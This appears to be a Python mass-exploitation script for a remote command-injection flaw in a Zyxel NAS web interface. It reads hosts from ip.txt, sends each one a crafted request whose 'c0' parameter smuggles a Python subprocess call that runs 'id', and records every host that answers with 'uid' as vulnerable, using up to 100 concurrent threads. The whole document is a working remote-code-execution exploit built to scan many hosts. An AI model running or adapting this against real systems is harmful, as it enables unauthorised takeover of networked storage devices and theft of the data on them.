#!/usr/bin/python3

import requests
import threading
import urllib3

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

file_lock = threading.Lock()


# WRITE_URL
def write_to_file(data):
    with file_lock:
        with open("vul_url.txt", "a+") as file:
            file.write(data + "\n")


def run(url):
    try:
        # Define the proxy dictionary for both protocols
        proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }

        vul_url = url.strip() + """/cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+and+False+or+__import__("subprocess").check_output("id",+shell=True)%23"""

        res = requests.get(
            url=vul_url,
            proxies=proxies,
            verify=False,
            timeout=10
        )

        if res.status_code == 200 and 'uid' in res.text:
            print(f"[+] {url.strip()} is vulnerable")
            write_to_file(url.strip())

    except Exception as e:
        print(f"[-] Error testing {url.strip()}: {e}")
        return None


max_threads = 100
semaphore = threading.Semaphore(max_threads)


class MyThread(threading.Thread):
    def __init__(self, url):
        super().__init__()
        self.url = url

    def run(self):
        try:
            run(self.url)
        except requests.exceptions.RequestException:
            pass
        finally:
            semaphore.release()


def print_ascii_art():
    print("""
  _____  _   __  ____      ___   ___   ___  ____      ___   ___  ___ ____    ____
 / ___/ | | / / / __/ ____ |_  | / _ \  |_  | / / / ____  |_  | / _ \ / _ \/_  /  |_  /
/ /__   | |/ / / _/  /___/ / __/ / // / / __/ /_  _//___/ / __/  \_, / \_, / / /  _/_ < 
\___/   |___/ /___/        /____/ \___/ /____/  /_/       /____/ /___/ /___/ /_/  /____/  @momikaa223 @bigb0x @Leviathan
    """)


def main():
    print_ascii_art()
    print("Script is running!")

    # Updated: Open ip.txt
    try:
        with open("ip.txt", "r") as file:
            urls = file.readlines()
    except FileNotFoundError:
        print("Error: ip.txt not found. Please ensure the file exists.")
        return

    threads = []

    for url in urls:
        if url.strip():  # Ensure line is not empty
            semaphore.acquire()
            thread = MyThread(url.strip())
            thread.start()
            threads.append(thread)

    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()